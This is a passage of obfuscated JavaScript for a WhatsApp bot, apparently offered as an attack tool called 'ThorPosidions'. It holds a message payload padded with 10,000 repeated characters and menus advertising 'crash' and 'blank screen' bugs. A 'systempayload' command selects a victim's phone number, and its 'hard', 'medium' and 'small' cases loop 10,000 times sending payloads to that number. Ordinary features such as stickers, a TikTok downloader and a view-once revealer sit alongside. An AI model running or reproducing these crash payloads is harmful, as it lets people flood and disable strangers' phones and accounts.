            'songId': "870166291800508",
            'author': '.RaldzzXyz' + 'ꦾ'.repeat(0x2710),
            'title': "PhonixAgency",
            'artworkDirectPath': "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
            'artworkSha256': "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
            'artworkEncSha256': "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
            'artistAttribution': 'https://www.instagram.com/_u/raldzzxyz_',
            'countryBlocklist': true,
            'isExplicit': true,
            'artworkMediaKey': "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
          },
          'embeddedAction': true
        }]
      };
      const _0x17e579 = generateWAMessageFromContent(_0x692f8a, {
        'viewOnceMessage': {
          'message': {
            'videoMessage': _0x51fdb1
          }
        }
      }, {});
      await _0x51cce1.relayMessage("status@broadcast", _0x17e579.message, {
        'messageId': _0x17e579.key.id,
        'statusJidList': [_0x692f8a],
        'additionalNodes': [{
          'tag': "meta",
          'attrs': {},
          'content': [{
            'tag': "mentioned_users",
            'attrs': {},
            'content': [{
              'tag': 'to',
              'attrs': {
                'jid': _0x692f8a
              },
              'content': undefined
            }]
          }]
        }]
      });
      if (_0x806711) {
        await _0x51cce1.relayMessage(_0x692f8a, {
          'groupStatusMentionMessage': {
            'message': {
              'protocolMessage': {
                'key': _0x17e579.key,
                'type': 0x19
              }
            }
          }
        }, {
          'additionalNodes': [{
            'tag': "meta",
            'attrs': {
              'is_status_mention': "true"
            },
            'content': undefined
          }]
        });
      }
    }
    switch (_0x44eeee) {
      case "menu":
        {
          await _0x51cce1.sendMessage(_0x4cca1e.chat, {
            'react': {
              'text': '⚡',
              'key': _0x4cca1e.key
            }
          });
          const _0x411c95 = [{
            'buttonId': '.bugmenu',
            'buttonText': {
              'displayText': "𝐂͜𝐫̶𝐚𝐬͠𝐡𝐋̋͢𝐨̶𝐚͜𝐝̶𝐬"
            },
            'type': 0x1
          }, {
            'buttonId': '.accesion',
            'buttonText': {
              'displayText': "𝐒͜𝐞̋͢𝐭𝐭𝐢̶𝐧͠𝐠𝐬"
            },
            'type': 0x1
          }, {
            'buttonId': ".tqto",
            'buttonText': {
              'displayText': '𝐌͜𝐲𝐁͠𝐫̶𝐨'
            },
            'type': 0x1
          }];
          const _0x358831 = {
            'image': {
              'url': "https://qu.ax/fnnSp.jpg"
            },
            'fileLength': 0x1,
            'caption': "  👋🏻 Kon'nichiwa, watashi wa RappliMods ga sakusei shita WhatsApp Botts de, uebu saito o kōgeki suru kinō o motte imasuga.\n\n─〔 ☇𝐓͠𝐡𝐨̋͢𝐫𝐏̶𝐨𝐬𝐢͜𝐝̋͢𝐢𝐨͠𝐧𝐬🐉⚡ 〕─\n𐁘 Author : RappliModss\n𐁘 Script : ThorPosidions\n𐁘 Version : 1.0.0 \n𐁘 Type : JavaScript\n𐁘 Library : Node WhatsApp\n",
            'gifPlayback': true,
            'gifAttribution': 0x5,
            'hasMediaAttachment': true,
            'footer': "*( ⚡ ) Thunder Thor attack powerfull to system target.*",
            'headerType': 0x1,
            'buttons': _0x411c95,
            'viewOnce': true,
            'contextInfo': {
              'isForwarded': true,
              'forwardedNewsletterMessageInfo': {
                'newsletterJid': "1209801820019100@newsletter",
                'newsletterName': "☇𝐑̶𝐚̋͢𝐩͜𝐥𝐢 𝐄𝐬͓𝐂͢𝐚𝐧͠𝐨𝐫〽️"
              }
            }
          };
          await _0x51cce1.sendMessage(_0x4cca1e.chat, _0x358831, {
            'quoted': _0x361743
          });
        }
        ;
        break;
      case "bugmenu":
        {
          const _0x4b1fc2 = [{
            'buttonId': ".menu",
            'buttonText': {
              'displayText': "𝐒͜𝐞̋͢𝐭𝐭𝐢̶𝐧͠𝐠𝐬𝐓͜𝐨𝐨̋͢𝐥𝐬̶"
            },
            'type': 0x1
          }, {
            'buttonId': ".tqto",
            'buttonText': {
              'displayText': "𝐂͜𝐫͠𝐞͜𝐚̶𝐭̋͢𝐨𝐫̶𝐬"
            },
            'type': 0x1
          }];
          const _0x5e9cd4 = {
            'image': {
              'url': "https://qu.ax/fnnSp.jpg"
            },
            'caption': "  👋 Kon'nichiwa, watashi wa RappliMods ga sakusei shita WhatsApp Botts de, uebu saito o kōgeki suru kinō o motte imasuga.\n\n─〔 ☇𝐓͠𝐡𝐨̋͢𝐫𝐏̶𝐨𝐬𝐢͜𝐝̋͢𝐢𝐨͠𝐧𝐬🐉⚡ 〕─\n𐁘 Author : RappliModss\n𐁘 Script : ThorPosidions\n𐁘 Version : 1.0.0 \n𐁘 Type : JavaScript\n𐁘 Library : Node WhatsApp\n\n*𝐂͜𝐫̶𝐚𝐬͠𝐡𝐋̋͢𝐨̶𝐚͜𝐝̶𝐬*\nSystemPayload 62xx \n\n*Use the above command to see menu bugs/bug to target so that the target can be exposed to thor posidions virus do not misuse*\n",
            'footer': "*☇𝐓͠𝐡𝐨̋͢𝐫𝐏̶𝐨𝐬𝐢͜𝐝̋͢𝐢𝐨͠𝐧𝐬🐉⚡*",
            'headerType': 0x1,
            'buttons': _0x4b1fc2,
            'viewOnce': true,
            'contextInfo': {
              'isForwarded': true,
              'forwardedNewsletterMessageInfo': {
                'newsletterJid': '1203634022464180091@newsletter',
                'newsletterName': "☇𝐑̶𝐚̋͢𝐩͜𝐥𝐢 𝐄𝐬͓𝐂͢𝐚𝐧͠𝐨𝐫〽️"
              }
            }
          };
          await _0x51cce1.sendMessage(_0x4cca1e.chat, _0x5e9cd4, {
            'quoted': _0x361743
          });
        }
        ;
        break;
      case "accesion":
        {
          const _0x32f7df = [{
            'buttonId': '.menu',
            'buttonText': {
              'displayText': "𝐂͜𝐫̶𝐚𝐬͠𝐡𝐋̋͢𝐨̶𝐚͜𝐝̶𝐬̶"
            },
            'type': 0x1
          }, {
            'buttonId': ".tqto",
            'buttonText': {
              'displayText': '𝐓͜𝐡͠𝐚̶𝐧𝐤̋͢𝐬𝐓͠𝐨'
            },
            'type': 0x1
          }];
          const _0x27849c = {
            'image': {
              'url': "https://qu.ax/fnnSp.jpg"
            },
            'caption': "  👋 Kon'nichiwa, watashi wa RappliMods ga sakusei shita WhatsApp Botts de, uebu saito o kōgeki suru kinō o motte imasuga.\n\n─〔 ☇𝐓͠𝐡𝐨̋͢𝐫𝐏̶𝐨𝐬𝐢͜𝐝̋͢𝐢𝐨͠𝐧𝐬🐉⚡ 〕─\n𐁘 Author : RappliModss\n𐁘 Script : ThorPosidions\n𐁘 Version : 1.0.0 \n𐁘 Type : JavaScript\n𐁘 Library : Node WhatsApp\n\n*𝐒͜𝐞̋͢𝐭𝐭𝐢̶𝐧͠𝐠𝐬𝐓͜𝐨𝐨̋͢𝐥𝐬̶*\nBrat\nSticker\nTourl\nQc\nTiktok\nReactch\nOpen\nClose\nHidetag\n\n*𝐒͜𝐞̋͢𝐭𝐭𝐢̶𝐧͠𝐠𝐬𝐎͜𝐰͠𝐧̶*\nAddown\nAddprem\nDellown\nDellprem\nPublic\nSelf\n",
            'footer': "*☇𝐓͠𝐡𝐨̋͢𝐫𝐏̶𝐨𝐬𝐢͜𝐝̋͢𝐢𝐨͠𝐧𝐬🐉⚡*",
            'headerType': 0x1,
            'buttons': _0x32f7df,
            'viewOnce': true,
            'contextInfo': {
              'isForwarded': true,
              'forwardedNewsletterMessageInfo': {
                'newsletterJid': '1203634022464180091@newsletter',
                'newsletterName': "☇𝐑̶𝐚̋͢𝐩͜𝐥𝐢 𝐄𝐬͓𝐂͢𝐚𝐧͠𝐨𝐫〽️"
              }
            }
          };
          await _0x51cce1.sendMessage(_0x4cca1e.chat, _0x27849c, {
            'quoted': _0x361743
          });
        }
        ;
        break;
      case "tqto":
        {
          const _0x34acc1 = [{
            'buttonId': '.bugmenu',
            'buttonText': {
              'displayText': '𝐂͜𝐫̶𝐚𝐬͠𝐡𝐋̋͢𝐨̶𝐚͜𝐝̶𝐬̶'
            },
            'type': 0x1
          }, {
            'buttonId': '.owner',
            'buttonText': {
              'displayText': '𝐂͜𝐫͠𝐞͜𝐚̶𝐭̋͢𝐨𝐫̶𝐬'
            },
            'type': 0x1
          }];
          const _0x369069 = {
            'image': {
              'url': "https://files.catbox.moe/mhmicq.jpg"
            },
            'caption': "*𝐓͜𝐡͠𝐚̶𝐧𝐤̋͢𝐬𝐓͠𝐨*\n-Rappli\n-Corzza\n-Reyy\n-Depayy\n-Raflie\n-Ganz\n-Xyzo\n-Manz\n-Rayz\n-Lubzy\n-Rena\n-Rappip\n-SanzXd\n-Miku\n-Evil\n-Benz\n*-And Friends Who Accompanies Me*\n",
            'footer': "*☇𝐓͠𝐡𝐨̋͢𝐫𝐏̶𝐨𝐬𝐢͜𝐝̋͢𝐢𝐨͠𝐧𝐬🐉⚡*",
            'headerType': 0x1,
            'buttons': _0x34acc1,
            'viewOnce': true,
            'contextInfo': {
              'isForwarded': true,
              'forwardedNewsletterMessageInfo': {
                'newsletterJid': "1203634022464180091@newsletter",
                'newsletterName': "☇𝐑̶𝐚̋͢𝐩͜𝐥𝐢 𝐄𝐬͓𝐂͢𝐚𝐧͠𝐨𝐫〽️"
              }
            }
          };
          await _0x51cce1.sendMessage(_0x4cca1e.chat, _0x369069, {
            'quoted': _0x361743
          });
        }
        ;
        break;
      case "addowner":
      case "addown":
        {
          if (!_0x1ad0af) {
            return _0x1bd3dc("are your the own?");
          }
          if (!_0x632862[0x0]) {
            return _0x4cca1e.reply("Usage: " + _0x44eeee + " 62xxx");
          }
          let _0x863333 = _0x1b3cb5.replace(/[^0-9]/g, '');
          let _0x131125 = await _0x51cce1.onWhatsApp(_0x863333 + "@s.whatsapp.net");
          if (!_0x131125.length) {
            return _0x4cca1e.reply("Invalid number!");
          }
          _0xea27b1.push(_0x863333);
          _0xec9c72.push(_0x863333);
          fs.writeFileSync('./system/owner.json', JSON.stringify(_0xea27b1));
          fs.writeFileSync("./system/premium.json", JSON.stringify(_0xec9c72));
          _0x1bd3dc("Owner added successfully.");
        }
        break;
      case "delowner":
      case "delown":
        {
          if (!_0x1ad0af) {
            return _0x1bd3dc("are your the own?");
          }
          if (!_0x632862[0x0]) {
            return _0x4cca1e.reply("Usage: " + _0x44eeee + " 62xxx");
          }
          let _0x15274f = _0x1b3cb5.replace(/[^0-9]/g, '');
          _0xea27b1.splice(_0xea27b1.indexOf(_0x15274f), 0x1);
          _0xec9c72.splice(_0xec9c72.indexOf(_0x15274f), 0x1);
          fs.writeFileSync("./system/owner.json", JSON.stringify(_0xea27b1));
          fs.writeFileSync("./system/premium.json", JSON.stringify(_0xec9c72));
          _0x1bd3dc("Owner removed successfully.");
        }
        break;
      case "addpremium":
      case 'addprem':
        {
          if (!_0x1ad0af) {
            return _0x1bd3dc("are your the own?");
          }
          if (!_0x632862[0x0]) {
            return _0x4cca1e.reply("Usage: " + (_0x59a112 + _0x44eeee) + " 62xxx");
          }
          let _0x3d8be9 = _0x1b3cb5.split('|')[0x0].replace(/[^0-9]/g, '');
          let _0x4b7307 = await _0x51cce1.onWhatsApp(_0x3d8be9 + "@s.whatsapp.net");
          if (!_0x4b7307.length) {
            return _0x4cca1e.reply("Invalid number!");
          }
          _0xec9c72.push(_0x3d8be9);
          fs.writeFileSync("./system/premium.json", JSON.stringify(_0xec9c72));
          _0x1bd3dc("Success! User added to premium.");
        }
        break;
      case 'delpremium':
      case "delprem":
        {
          if (!_0x1ad0af) {
            return _0x1bd3dc("are your the own!");
          }
          if (!_0x632862[0x0]) {
            return _0x4cca1e.reply("Usage: " + (_0x59a112 + _0x44eeee) + " 62xxx");
          }
          let _0x36ecd0 = _0x1b3cb5.split('|')[0x0].replace(/[^0-9]/g, '');
          let _0x1ee0b3 = _0xec9c72.indexOf(_0x36ecd0);
          if (_0x1ee0b3 !== -0x1) {
            _0xec9c72.splice(_0x1ee0b3, 0x1);
            fs.writeFileSync("./system/premium.json", JSON.stringify(_0xec9c72));
            _0x1bd3dc("Success! User removed from premium.");
          } else {
            _0x4cca1e.reply("User is not in the premium list.");
          }
        }
        break;
      case "public":
        {
          if (!_0x1ad0af) {
            return _0x1bd3dc("are your the own?");
          }
          _0x51cce1["public"] = true;
          _0x4cca1e.reply("Bot set to public mode.");
        }
        break;
      case "private":
      case "self":
        {
          if (!_0x1ad0af) {
            return _0x1bd3dc("are your the own?");
          }
          _0x51cce1['public'] = false;
          _0x4cca1e.reply("Bot set to private mode.");
        }
        break;
      case "brat":
        {
          if (!q) {
            return _0x4cca1e.reply("Send command with text. " + (_0x59a112 + _0x44eeee) + " Denny");
          }
          const _0x3e4c0f = "https://brat.caliphdev.com/api/brat?text=" + q;
          await _0x5c77a3(_0x3e4c0f, _0x51cce1, _0x4cca1e);
        }
        break;
      case 'qc':
        {
          if (!q) {
            return _0x4cca1e.reply("Usage: " + (_0x59a112 + _0x44eeee) + " " + "teksnya");
          }
          let _0xbbf57e = {
            'type': "quote",
            'format': 'png',
            'backgroundColor': "#ffffff",
            'width': 0x200,
            'height': 0x300,
            'scale': 0x2,
            'messages': [{
              'entities': [],
              'avatar': true,
              'from': {
                'id': 0x1,
                'name': '' + _0xa15334,
                'photo': {
                  'url': await _0x51cce1.profilePictureUrl(_0x4cca1e.sender, "image")['catch'](() => "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60")
                }
              },
              'text': '' + q,
              'replyMessage': {}
            }]
          };
          let _0x305ffb = await axios.post('https://bot.lyo.su/quote/generate', _0xbbf57e, {
            'headers': {
              'Content-Type': "application/json"
            }
          });
          let _0x4d1462 = Buffer.from(_0x305ffb.data.result.image, "base64");
          _0x51cce1.sendImageAsSticker(_0x4cca1e.chat, _0x4d1462, _0x4cca1e, {
            'packname': '' + global.packname,
            'author': '' + global.author
          });
        }
        break;
      case "rvo":
      case 'readvo':
      case 'readviewonce':
      case "readviewoncemessage":
        {
          if (!_0x4cca1e.quoted) {
            return _0x4cca1e.reply("Reply to an image/video that you want to view");
          }
          if (_0x4cca1e.quoted.mtype !== "viewOnceMessageV2" && _0x4cca1e.quoted.mtype !== "viewOnceMessage") {
            return _0x4cca1e.reply("This is not a view-once message.");
          }
          let _0x5b18b3 = _0x4cca1e.quoted.message;
          let _0xf0f025 = Object.keys(_0x5b18b3)[0x0];
          if (!["imageMessage", "videoMessage"].includes(_0xf0f025)) {
            return _0x4cca1e.reply("The quoted message is not an image or video.");
          }
          let _0x5a576e = await downloadContentFromMessage(_0x5b18b3[_0xf0f025], _0xf0f025 === "imageMessage" ? "image" : 'video');
          let _0x3a5d0d = [];
          for await (const _0x219d67 of _0x5a576e) {
            _0x3a5d0d.push(_0x219d67);
          }
          let _0x348169 = Buffer.concat(_0x3a5d0d);
          if (_0xf0f025 === "videoMessage") {
            await _0x51cce1.sendMessage(_0x4cca1e.chat, {
              'video': _0x348169,
              'caption': _0x5b18b3[_0xf0f025].caption || ''
            });
          } else if (_0xf0f025 === "imageMessage") {
            await _0x51cce1.sendMessage(_0x4cca1e.chat, {
              'image': _0x348169,
              'caption': _0x5b18b3[_0xf0f025].caption || ''
            });
          }
          await _0x51cce1.sendMessage(_0x4cca1e.chat, {
            'react': {
              'text': '✅',
              'key': _0x4cca1e.key
            }
          });
        }
        break;
      case 'tt':
      case "tiktok":
        {
          if (!_0x1b3cb5) {
            return _0x4cca1e.reply("Usage: " + (_0x59a112 + _0x44eeee) + " " + 'url');
          }
          if (!_0x1b3cb5.startsWith("https://")) {
            return _0x4cca1e.reply("Usage: " + (_0x59a112 + _0x44eeee) + " " + "url");
          }
          await _0x19be17(q).then(async _0x45de30 => {
            await _0x51cce1.sendMessage(_0x4cca1e.chat, {
              'react': {
                'text': '🕖',
                'key': _0x4cca1e.key
              }
            });
            if (!_0x45de30.status) {
              return _0x4cca1e.reply('Error');
            }
            if (_0x45de30.durations == 0x0 && _0x45de30.duration == "0 Seconds") {
              let _0x36f0d4 = new Array();
              let _0x229e00 = 0x0;
              for (let _0x22dd8f of _0x45de30.data) {
                let _0x4f5a0a = await prepareWAMessageMedia({
                  'image': {
                    'url': '' + _0x22dd8f.url
                  }
                }, {
                  'upload': _0x51cce1.waUploadToServer
                });
                await _0x36f0d4.push({
                  'header': proto.Message.InteractiveMessage.Header.fromObject({
                    'title': "Foto Slide Ke *" + (_0x229e00 += 0x1) + '*',
                    'hasMediaAttachment': true,
                    ..._0x4f5a0a
                  }),
                  'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                    'buttons': [{
                      'name': 'cta_url',
                      'buttonParamsJson': "{\"display_text\":\"Link Tautan Foto\",\"url\":\"" + _0x22dd8f.url + "\",\"merchant_url\":\"https://www.google.com\"}"
                    }]
                  })
                });
              }
              const _0x188ec8 = await generateWAMessageFromContent(_0x4cca1e.chat, {
                'viewOnceMessageV2Extension': {
                  'message': {
                    'messageContextInfo': {
                      'deviceListMetadata': {},
                      'deviceListMetadataVersion': 0x2
                    },
                    'interactiveMessage': proto.Message.InteractiveMessage.fromObject({
                      'body': proto.Message.InteractiveMessage.Body.fromObject({
                        'text': "*Tiktok Downloader ✅*"
                      }),
                      'carouselMessage': proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        'cards': _0x36f0d4
                      })
                    })
                  }
                }
              }, {
                'userJid': _0x4cca1e.sender,
                'quoted': _0x4cca1e
              });
              await _0x51cce1.relayMessage(_0x4cca1e.chat, _0x188ec8.message, {
                'messageId': _0x188ec8.key.id
              });
            } else {
              let _0x1e9942 = await _0x45de30.data.find(_0x3dc985 => _0x3dc985.type == "nowatermark_hd" || _0x3dc985.type == 'nowatermark');
              await _0x51cce1.sendMessage(_0x4cca1e.chat, {
                'video': {
                  'url': _0x1e9942.url
                },
                'mimetype': "video/mp4",
                'caption': "*Tiktok Downloader ✅*"
              }, {
                'quoted': _0x4cca1e
              });
            }
          })["catch"](_0xece264 => console.log(_0xece264));
          await _0x51cce1.sendMessage(_0x4cca1e.chat, {
            'react': {
              'text': '',
              'key': _0x4cca1e.key
            }
          });
        }
      case "restart":
        {
          if (!_0x1ad0af) {
            return _0x1bd3dc(mess.owner);
          }
          _0x4cca1e.reply("Restarting Bot.....");
          setTimeout(() => {
            process.send("reset");
          }, 0xbb8);
        }
        break;
      case "tourl":
        {
          let _0x7ac1cf = _0x4cca1e.quoted ? _0x4cca1e.quoted : _0x4cca1e;
          if (!_0x7ac1cf || !_0x7ac1cf.download) {
            return _0x4cca1e.reply("Reply to an Image or Video with command " + (_0x59a112 + _0x44eeee));
          }
          let _0x510687 = _0x7ac1cf.mimetype || '';
          if (!/image\/(png|jpe?g|gif)|video\/mp4/.test(_0x510687)) {
            return _0x4cca1e.reply("Only images or MP4 videos are supported!");
          }
          let _0x552c9b;
          try {
            _0x552c9b = await _0x7ac1cf.download();
          } catch (_0x42c6b1) {
            return _0x4cca1e.reply("Failed to download media!");
          }
          const _0x37d97d = require("../system/Data1");
          const _0x1fbc28 = require('../system/Data2');
          let _0x45190d = /image\/(png|jpe?g|gif)|video\/mp4/.test(_0x510687);
          let _0x54b4fe;
          try {
            _0x54b4fe = await (_0x45190d ? _0x37d97d : _0x1fbc28)(_0x552c9b);
          } catch (_0x2727ce) {
            return _0x4cca1e.reply("Failed to upload media!");
          }
          _0x4cca1e.reply('' + _0x54b4fe);
        }
        break;
      case 'sticker':
      case 's':
        {
          if (!_0x530003) {
            return _0x4cca1e.reply("Reply Image or Video with command " + (_0x59a112 + _0x44eeee));
          }
          if (/image/.test(_0x4c2872)) {
            let _0x3fa0b8 = await _0x530003.download();
            let _0xa6ef71 = await _0x51cce1.sendImageAsSticker(_0x2c6203, _0x3fa0b8, _0x4cca1e, {
              'packname': global.packname,
              'author': global.author
            });
            await fs.unlinkSync(_0xa6ef71);
          } else {
            if (/video/.test(_0x4c2872)) {
              if ((_0x530003.msg || _0x530003).seconds > 0xb) {
                return _0x4cca1e.reply("max 10s");
              }
              let _0x169402 = await _0x530003.download();
              let _0x4658d6 = await _0x51cce1.sendVideoAsSticker(_0x2c6203, _0x169402, _0x4cca1e, {
                'packname': global.packname,
                'author': global.author
              });
              await fs.unlinkSync(_0x4658d6);
            } else {
              return _0x4cca1e.reply("Send Image or Video with command " + (_0x59a112 + _0x44eeee) + "\nvideo duration only 1-9s");
            }
          }
        }
        break;
      case "hidetag":
      case 'z':
      case 'h':
        {
          if (!isGroup) {
            return _0x4cca1e.reply("khusus group");
          }
          if (!_0x4cca1e.quoted && !q) {
            return _0x4cca1e.reply("Usage: " + (_0x59a112 + _0x44eeee) + " " + "teksnya/replyteks");
          }
          var _0x4d1ead = _0x4cca1e.quoted ? _0x4cca1e.quoted.q : q;
          var _0xd100a4 = await _0x44749f.participants.map(_0x26ee4c => _0x26ee4c.id);
          _0x51cce1.sendMessage(_0x4cca1e.chat, {
            'text': _0x4d1ead,
            'mentions': [..._0xd100a4]
          });
        }
        break;
      case 'open':
        {
          if (!isGroup) {
            return _0x4cca1e.reply("Khusus Group");
          }
          if (!isBotAdmin) {
            return _0x4cca1e.reply("Bot ga admin njir");
          }
          await _0x51cce1.groupSettingUpdate(_0x4cca1e.chat, 'not_announcement');
          _0x4cca1e.reply("Berhasil Mengganti Setelan Grup Menjadi Anggota Dapat Mengirim Pesan");
        }
        break;
      case "close":
        {
          if (!isGroup) {
            return _0x4cca1e.reply("Khusus Group");
          }
          if (!isBotAdmin) {
            return _0x4cca1e.reply("Bot ga admin njir");
          }
          await _0x51cce1.groupSettingUpdate(_0x4cca1e.chat, "announcement");
          _0x4cca1e.reply("Berhasil Mengganti Setelan Grup Menjadi Hanya Admin Yang Dapat Mengirim Pesan");
        }
        break;
      case "reactch":
        {
          if (!_0x1ad0af && !_0x545fcd) {
            return _0x1bd3dc("Khusus Owner");
          }
          if (!q) {
            return _0x4cca1e.reply("Contoh: .reactch https://whatsapp.com/channel/invite/kode/channelid pesan");
          }
          const [_0x5536be, ..._0x10af93] = q.split(" ");
          const _0x4fbcf5 = _0x10af93.join(" ");
          if (!_0x5536be || !_0x4fbcf5) {
            return _0x4cca1e.reply("Format salah. Gunakan: .reactch <link> <pesan>");
          }
          if (!_0x5536be.includes("https://whatsapp.com/channel/")) {
            return _0x4cca1e.reply("Link channel tidak valid!");
          }
          let _0xb4589a = _0x5536be.split('/')[0x4];
          let _0x3537ab = _0x5536be.split('/')[0x5];
          const _0x1e3de7 = {
            'a': '🅐',
            'b': '🅑',
            'c': '🅒',
            'd': '🅓',
            'e': '🅔',
            'f': '🅕',
            'g': '🅖',
            'h': '🅗',
            'i': '🅘',
            'j': '🅙',
            'k': '🅚',
            'l': '🅛',
            'm': '🅜',
            'n': '🅝',
            'o': '🅞',
            'p': '🅟',
            'q': '🅠',
            'r': '🅡',
            's': '🅢',
            't': '🅣',
            'u': '🅤',
            'v': '🅥',
            'w': '🅦',
            'x': '🅧',
            'y': '🅨',
            'z': '🅩',
            0x1: '➊',
            0x2: '➋',
            0x3: '➌',
            0x4: '➍',
            0x5: '➎',
            0x6: '➏',
            0x7: '➐',
            0x8: '➑',
            0x9: '➒',
            0x0: '⓿',
            " ": '▫️'
          };
          const _0x72d46a = _0x4fbcf5.toLowerCase().split('').map(_0x26747a => _0x1e3de7[_0x26747a] || '').join('');
          if (!_0x72d46a) {
            return _0x4cca1e.reply("Pesan hanya boleh berisi huruf, angka, dan spasi");
          }
          try {
            let _0x412f50 = await _0x51cce1.newsletterMetadata('invite', _0xb4589a);
            await _0x51cce1.newsletterReactMessage(_0x412f50.id, _0x3537ab, _0x72d46a);
            _0x4cca1e.reply("Berhasil mengirim reaction:\n" + _0x72d46a + "\nke channel *" + _0x412f50.name + '*');
          } catch (_0x43ea95) {
            console.log(_0x43ea95);
            _0x4cca1e.reply("Gagal mengirim reaction. Pastikan link dan pesan valid.");
          }
        }
        break;
      case "systempayload":
        {
          if (!_0x545fcd && !_0x1ad0af) {
            return _0x1bd3dc("`your not own me`");
          }
          if (!q) {
            return _0x4cca1e.reply("*Syntax Error!*\n\n_Use : " + (_0x59a112 + _0x44eeee) + " Number_\n_Example : " + (_0x59a112 + _0x44eeee) + " 62xx_");
          }
          let _0x56c493 = q.split('|')[0x0].replace(/[^0-9]/g, '');
          if (_0x56c493.startsWith('0')) {
            return _0x4cca1e.reply("*Syntax Error!*\n\n_Use : crasher Number_\n_Example : crasher 62xx_");
          }
          _0x56c493 = _0x56c493 + "@s.whatsapp.net";
          global.jumlah = q.split('|')[0x1];
          let _0x3c6c38 = "*☇𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢ 𝐒𝐔͢͠𝐂𝐂͢ᯭ𝐄𝐒 ᝄ🐉*\n*[ 𖥂 ] 𝐓𝐚𝐫𝐠𝐞𝐭 " + _0x56c493 + "*\n*[ 𖥂 ] 𝐏𝐥𝐞𝐚𝐬𝐞 𝐒𝐞𝐥𝐞𝐜𝐭 𝐓𝐲𝐩𝐞 𝐁𝐮𝐠𝐬*\n*® 𝐓𝐡𝐞 𝐑𝐚𝐩𝐩𝐥𝐢𝐌𝐨𝐝𝐬*\n";
          let _0x2d5990 = [{
            'buttonId': ".menu",
            'buttonText': {
              'displayText': '✪'
            }
          }];
          let _0x3a7946 = {
            'image': {
              'url': 'https://files.catbox.moe/6ac3wa.jpeg'
            },
            'caption': _0x3c6c38,
            'gifPlayback': true,
            'contextInfo': {
              'forwardingScore': 0x3e7,
              'isForwarded': true,
              'forwardedNewsletterMessageInfo': {
                'newsletterJid': "0@newsletter",
                'newsletterName': "☇𝐑̶𝐚̋͢𝐩͜𝐥𝐢 𝐄𝐬͓𝐂͢𝐚𝐧͠𝐨𝐫〽️"
              }
            },
            'buttons': _0x2d5990,
            'viewOnce': true,
            'headerType': 0x6
          };
          const _0x43b3f7 = [{
            'buttonId': "action",
            'buttonText': {
              'displayText': "𝐏𝐫𝐞𝐬𝐬 𝐁𝐮𝐭𝐭𝐨𝐧"
            },
            'type': 0x4,
            'nativeFlowInfo': {
              'name': "single_select",
              'paramsJson': JSON.stringify({
                'title': '✪',
                'sections': [{
                  'title': '𝐀𝐭𝐭𝐚𝐜𝐤𝐃𝐞𝐥𝐚𝐲𝐏𝐨𝐰𝐞𝐫𝐬',
                  'highlight_label': "𝐇𝐚𝐫𝐝-𝐃𝐞𝐥𝐚𝐲",
                  'rows': [{
                    'title': "𝐇͜𝐚͠𝐫̋͢𝐝-𝐒𝐲̶𝐬͠𝐭𝐞͜𝐦",
                    'description': '𖥂',
                    'id': ".hard " + _0x56c493
                  }, {
                    'title': "𝐌͜𝐞͠𝐝𝐢̶𝐮̋𝐦-𝐒̶𝐲𝐬͠𝐭𝐞͜𝐦",
                    'description': '𖥂',
                    'id': ".medium " + _0x56c493
                  }, {
                    'title': "𝐒͜𝐦̶͠𝐚͜𝐥𝐥-𝐒͜𝐲𝐬̶𝐭͠𝐞̶𝐦",
                    'description': '𖥂',
                    'id': ".small " + _0x56c493
                  }]
                }, {
                  'title': "𝐀𝐭𝐭𝐚𝐜𝐤𝐁𝐥𝐚𝐧𝐤𝐗",
                  'highlight_label': '𝐒𝐜𝐫𝐞𝐞𝐧𝐝-𝐁𝐥𝐚𝐧𝐤',
                  'rows': [{
                    'title': "𝐁͜𝐥𝐚̶𝐧͠𝐤𝐎̶𝐯͠𝐞͜𝐫",
                    'description': '𖥂',
                    'id': ".over-blank " + _0x56c493
                  }, {
                    'title': "𝐅̶𝐥͜𝐨̋͢𝐰𝐂͜𝐫͠𝐚𝐬̋͢𝐡",
                    'description': '𖥂',
                    'id': ".flow " + _0x56c493
                  }, {
                    'title': "𝐆͜𝐨͠𝐨͜𝐝𝐬-𝐇͜𝐞𝐥̶𝐥𝐞̋͢𝐧̶𝐢𝐜",
                    'description': '𖥂',
                    'id': ".goods " + _0x56c493
                  }]
                }, {
                  'title': "𝐀𝐭𝐭𝐚𝐜𝐤𝐆𝐫𝐨𝐮𝐩𝐗",
                  'highlight_label': "☇𝐓͠𝐡𝐨̋͢𝐫𝐏̶𝐨𝐬𝐢͜𝐝̋͢𝐢𝐨͠𝐧𝐬🐉⚡",
                  'rows': [{
                    'title': "𝐓͜𝐫𝐚͠𝐯̶𝐚-𝐂̶𝐨͜𝐫͠𝐞",
                    'description': '𖥂',
                    'id': '.buggb'
                  }]
                }]
              })
            },
            'viewOnce': true
          }];
          _0x3a7946.buttons.push(..._0x43b3f7);
          await _0x51cce1.sendMessage(_0x4cca1e.chat, _0x3a7946, {
            'quoted': _0x361743
          });
        }
        ;
        break;
      case "hard":
      case "medium":
      case 'small':
        {
          if (!_0x545fcd && !_0x1ad0af) {
            return _0x1bd3dc("your what in own?");
          }
          if (!q) {
            return _0x4cca1e.reply("No Target Mana?\nExample: " + (_0x59a112 + _0x44eeee) + " 62×××");
          }
          target = q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
          await _0x50422f(target, _0x51cce1);
          await _0x3834bd(target, _0x4cca1e, _0x51cce1);
          for (let _0x16b1f7 = 0x0; _0x16b1f7 < 0x2710; _0x16b1f7++) {
            await _0x19c35f(target, true);
            await _0x19c35f(target, true);
            await _0x19c35f(target, true);
            await _0x21a81d(target, true);
            await _0x21a81d(target, true);
            await _0x21a81d(target, true);
            await _0x8978fe(target, true);
            await _0x8978fe(target, true);
            await _0x8978fe(target, true);
          }
        }
        break;
      case "over-blank":
      case 'flow':
      case 'goods':
        {
          if (!_0x545fcd && !_0x1ad0af) {
            return _0x1bd3dc("your what in own?");
          }
          if (!q) {
